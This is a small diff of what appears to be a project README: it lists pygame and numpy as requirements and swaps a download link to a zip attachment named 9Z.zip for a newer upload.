@@ -10,5 +10,4 @@ required to run:
 - pygame
 - numpy
 
-zip: [9Z.zip](https://github.com/user-attachments/files/15954982/9Z.zip)
-
+zip: [9Z.zip](https://github.com/user-attachments/files/15972828/9Z.zip)
